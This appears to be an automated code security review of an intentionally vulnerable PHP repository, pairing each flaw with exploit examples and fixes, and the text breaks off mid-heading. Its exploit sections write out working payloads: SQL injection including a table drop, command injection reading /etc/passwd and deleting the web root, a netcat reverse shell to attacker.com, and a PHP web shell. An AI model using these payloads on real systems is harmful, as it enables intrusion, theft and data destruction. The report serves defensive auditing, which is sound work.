VSec Code Security Review
Repository : https://github.com/sirconscious/vulnerable_php_code.git
Generated  : 2026-03-13 21:45:15
============================================================

# CODE SECURITY REVIEW

====================================================
Repository : https://github.com/sirconscious/vulnerable_php_code.git
Language(s): PHP
Files      : 1 (main.php)
====================================================

## [EXECUTIVE SUMMARY]

This PHP application contains **critical, exploitable vulnerabilities** across every functional component. The code demonstrates fundamental security failures including SQL injection, command injection, arbitrary file upload, path traversal, cross-site scripting, and hardcoded credentials. This codebase is production-unsafe and requires immediate, comprehensive remediation before any deployment.

---

## [VULNERABILITIES]

### Vuln #1
**Severity** : Critical  
**Type** : SQL Injection  
**File** : main.php:19-22  
**Code** :
```php
$username = $_GET['username'];
$password = $_GET['password'];
$query = "SELECT * FROM users WHERE username='" . $username . "' AND password='" . $password . "'";
$result = mysqli_query($conn, $query);
```

**Exploit** :
```
GET /login.php?username=admin'--&password=anything
Resulting Query: SELECT * FROM users WHERE username='admin'--' AND password='anything'
Effect: The '--' comments out the password check, allowing authentication bypass.

Alternative:
GET /login.php?username=admin' OR '1'='1&password=anything
Resulting Query: SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'
Effect: Returns first admin user regardless of password.
```

**Fix** :
```php
// Use prepared statements (parameterized queries)
$stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();

if ($result->num_rows > 0) {
    $_SESSION['user'] = htmlspecialchars($username, ENT_QUOTES, 'UTF-8');
    echo "Welcome " . $_SESSION['user'];
} else {
    echo "Login failed";
}
$stmt->close();
```

---

### Vuln #2
**Severity** : Critical  
**Type** : Remote Code Execution (Command Injection)  
**File** : main.php:38-40  
**Code** :
```php
$host = $_GET['host'];
$output = shell_exec('ping -c 4 ' . $host);
echo "<pre>" . $output . "</pre>";
```

**Exploit** :
```
GET /exec.php?host=google.com; cat /etc/passwd
Resulting Command: ping -c 4 google.com; cat /etc/passwd
Effect: Executes arbitrary shell commands with web server process privileges.

More destructive:
GET /exec.php?host=google.com && rm -rf /var/www/html
GET /exec.php?host=127.0.0.1; nc -e /bin/bash attacker.com 4444
Effect: Data destruction, reverse shell access.
```

**Fix** :
```php
// Use escapeshellarg() + whitelist validation
$host = $_GET['host'];

// Validate IP/hostname format
if (!preg_match('/^[a-zA-Z0-9.-]+$/', $host)) {
    die("Invalid host format");
}

// Use escapeshellarg to safely pass as single argument
$output = shell_exec('ping -c 4 ' . escapeshellarg($host));
echo "<pre>" . htmlspecialchars($output, ENT_QUOTES, 'UTF-8') . "</pre>";

// BETTER: Avoid shell_exec entirely. Use a PHP-native solution:
// Consider using gethostbyname() or dedicated ping library with proper validation.
```

---

### Vuln #3
**Severity** : Critical  
**Type** : Arbitrary File Upload / Remote Code Execution  
**File** : main.php:31-35  
**Code** :
```php
if ($_FILES['file']['error'] == 0) {
    $dest = 'uploads/' . $_FILES['file']['name'];
    move_uploaded_file($_FILES['file']['tmp_name'], $dest);
    echo "Uploaded: " . $dest;
}
```

**Exploit** :
```
POST /upload.php with multipart/form-data:
- Upload file: shell.php containing <?php system($_GET['cmd']); ?>
- Filename stored as: uploads/shell.php
- Access via: /uploads/shell.php?cmd=id

Effect: Remote code execution as web server user.
Attacker can also upload:
- .phtml, .php7, .phar files (if server configured to execute)
- .htaccess to change execution rules
- Overwrite existing files (DoS or privilege escalation)
```

**Fix** :
```php
if ($_FILES['file']['error'] == 0) {
    // 1. Whitelist allowed MIME types
    $allowed_mime = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'];
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
    finfo_close($finfo);
    
    if (!in_array($mime, $allowed_mime)) {
        die("Invalid file type");
    }
    
    // 2. Whitelist extensions
    $allowed_ext = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
    $ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
    
    if (!in_array($ext, $allowed_ext)) {
        die("Invalid file extension");
    }
    
    // 3. Generate random filename to prevent overwrites and execution
    $filename = bin2hex(random_bytes(16)) . '.' . $ext;
    
    // 4. Store outside web root if possible
    $upload_dir = dirname(__DIR__) . '/uploads/'; // one level up
    $dest = $upload_dir . $filename;
    
    // 5. Verify directory exists and is writable
    if (!is_dir($upload_dir) || !is_writable($upload_dir)) {
        die("Upload directory error");
    }
    
    // 6. Check file size
    if ($_FILES['file']['size'] > 5 * 1024 * 1024) { // 5MB limit
        die("File too large");
    }
    
    if (move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
        // Never echo user-provided filename
        echo "File uploaded successfully";
    } else {
        die("Upload failed");
    }
}
```

---

### Vuln #4
**Severity** : Critical  
**Type** : Path Traversal / Arbitrary File Inclusion  
**File** : main.php:44-46  
**Code** :
```php
$page = $_GET['page'];
include($page . '.php');
```

**Exploit** :
```
GET /file.php?page=../../etc/passwd
Resulting Include: include('../../etc/passwd.php');
Effect: Reads arbitrary files from filesystem.

More sophisticated:
GET /file.php?page=php://filter/convert.base64-encode/resource=../../config.php
Effect: Base64-encodes and reads config.php (bypasses .php check).

Alternative (if allow_url_include=1):
GET /file.php?page=http://attacker.com/shell.txt
Effect: Remote code execution from attacker's server.
```

**Fix** :
```php
// 1. Use whitelist approach (BEST)
$allowed_pages = ['home', 'about', 'contact', 'dashboard', 'profile'];
$page = $_GET['page'] ?? 'home';

if (!in_array($page, $allowed_pages)) {
    die("Invalid page");
}

$file = __DIR__ . '/pages/' . $page . '.php';

// 2. Verify file exists and is within allowed directory
if (!file_exists($file) || !is_file($file)) {
    die("Page not found");
}

$base_dir = realpath(__DIR__ . '/pages/');
$real_file = realpath($file);

if ($real_file === false || strpos($real_file, $base_dir) !== 0) {
    die("Invalid path");
}

// 3. Use include after validation
include($real_file);
```

---

### Vuln #5
**Severity** : High  
**Type** : Cross-Site Scripting (XSS) - Reflected  
**File** : main.php:24-25  
**Code** :
```php
$_SESSION['user'] = $username;
echo "Welcome " . $username;
```

**Exploit** :
```
GET /login.php?username=<img src=x onerror="alert('XSS')">&password=test
Output: Welcome <img src=x onerror="alert('XSS')">

Effect: JavaScript executes in victim's browser, can steal session cookies, 
redirect to phishing site, or perform actions on their behalf.
```

**Fix** :
```php
// Use htmlspecialchars() to encode user input
echo "Welcome " . htmlspecialchars($username, ENT_QUOTES, 'UTF-8');

// For HTML context:
echo "<div>Welcome " . htmlspecialchars($username, ENT_QUOTES, 'UTF-8') . "</div>";

// For JavaScript context:
echo "<script>var user = '" . json_encode($username) . "';</script>";

// For URL context:
echo '<a href="' . htmlspecialchars($profile_url, ENT_QUOTES, 'UTF-8') . '">Profile</a>';
```

---

### Vuln #6
**Severity** : Critical  
**Type** : Insecure Direct Object Reference (IDOR) + Sensitive Data Exposure  
**File** : main.php:49-56  
**Code** :
```php
$user_id = $_GET['id'];
$query = "SELECT * FROM users WHERE id=" . $user_id;
$result = mysqli_query($conn, $query);
$user = mysqli_fetch_assoc($result);
echo json_encode($user);
```

**Exploit** :
```
GET /api.php?id=1
Response: {"id":"1","username":"admin","email":"admin@site.com","password":"$2y$10$...hash...","phone":"555-1234","ssn":"123-45-6789"}

Attacker iterates:
GET /api.php?id=2
GET /api.php?id=3
...
GET /api.php?id=999

Effect: 
1. No authentication check - anyone can access any user profile
2. Sensitive fields exposed (password hash, SSN, phone)
3. User enumeration - attacker discovers all users
4. SQL injection still present on $user_id parameter
```

**Fix** :
```php
// 1. Require authentication
session_start();
if (!isset($_SESSION['user_id'])) {
    http_response_code(401);
    die(json_encode(['error' => 'Unauthorized']));
}

// 2. Use prepared statement (prevents SQL injection)
$user_id = intval($_GET['id']);

// 3. Check authorization - user can only view their own profile
if ((int)$_SESSION['user_id'] !== $user_id) {
    http_response_code(403);
    die(json_encode(['error' => 'Forbidden']));
}

// 4. Select only necessary, non-sensitive fields
$stmt = $conn->prepare("SELECT id, username, email FROM users WHERE id=?");
$stmt->bind_param("i", $user_id);
$stmt->execute();
$result = $stmt->get_result();

if ($result->num_rows === 0) {
    http_response_code(404);
    die(json_encode(['error' => 'User not found']));
}

$user = $result->fetch_assoc();
header('Content-Type: application/json');
echo json_encode($user);
$stmt->close();
```

---

### Vuln #7
**Severity** : High  
**Type** : SQL Injection (Integer-based)  
**File** : main.php:49-50  
**Code** :
```php
$user_id = $_GET['id'];
$query = "SELECT * FROM users WHERE id=" . $user_id;
```

**Exploit** :
```
GET /api.php?id=1 UNION SELECT 1,2,3,4,5,6,7--
Effect: Union-based SQL injection extracts all database columns.

GET /api.php?id=-1 UNION SELECT user(),version(),3,4,5,6,7--
Effect: Extracts database user and version information.

GET /api.php?id=1; DROP TABLE users;--
Effect: Database destruction (destructive injection).
```

**Fix** : See Vuln #6 fix above (use prepared statements with `intval()` or parameterized queries).

---

## [SECURITY MISCONFIGURATIONS]

### MisConfig #1
**Severity** : Critical  
**Type** : Hardcoded Database Credentials  
**File** : main.php:2-5  
**Code** :
```php
define('DB_HOST', 'localhost');
define('DB_USER', 'root');
define('DB_PASS', 'admin123');
define('DB_NAME', 'shop_db');
```

**Impact** :
- Source code exposed in version control, backups, or logs
- Anyone with repository access gains database access
- Using default 'root' user violates principle of least privilege
- Weak password 'admin123' is dictionary-attackable

**Fix** :
```php
// Use environment variables (.env file, not committed to git)
$db_host = getenv('DB_HOST') ?: 'localhost';
$db_user = getenv('DB_USER');
$db_pass = getenv('DB_PASS');
$db_name = getenv('DB_NAME');

if (!$db_user || !$db_pass) {
    die("Database credentials not configured");
}

$conn = mysqli_connect($db_host, $db_user, $db_pass, $db_name);
if (!$conn) {
    error_log("Database connection failed: " . mysqli_connect_error());
    die("Database connection error"); // Don't expose details
}

// .env file (in project root, NOT committed):
// DB_HOST=localhost
// DB_USER=shop_user
// DB_PASS=GeneratedStrongPassword123!
// DB_NAME=shop_db

// .gitignore entry:
// .env
// *.env
```

---

### MisConfig #2
**Severity** : High  
**Type** : Hardcoded Secret Key  
**File** : main.php:6  
**Code** :
```php
define('SECRET_KEY', 'abc123secret');
```

**Impact** :
- Exposed in version control
- If used for CSRF tokens, JWT signing, or encryption, secrets are compromised
- Anyone can forge valid tokens

**Fix** :
```php
// Use environment variable like credentials
define('SECRET_KEY', getenv('SECRET_KEY'));

if (!defined('SECRET_KEY') || empty(SECRET_KEY)) {
    die("SECRET_KEY not configured");
}

// Generate strong key (for initial setup):
// php -r "echo base64_encode(random_bytes(32));"
```

---

### MisConfig #3
**Severity** : High  
**Type** : Debug Mode Enabled in Production  
**File** : main.php:7  
**Code** :
```php
define('DEBUG', true);
```

**Impact** :
- Exposes detailed error messages, stack traces, and system information
- Information disclosure aids attackers in reconnaissance
- Slows down application

**Fix** :
```php
// Use environment-specific configuration
define('DEBUG', getenv('DEBUG') === 'true' && getenv('APP_ENV') === 'development');

// In production .env:
// DEBUG=false
// APP_ENV=production

// Configure error handling:
if (!DEBUG) {
    error_reporting(0);
    ini_set('display_errors', 0);
    ini_set('log_errors', 1);
    ini_set('error_log', '/var/log/php-errors.log');
}
```

---

### Mis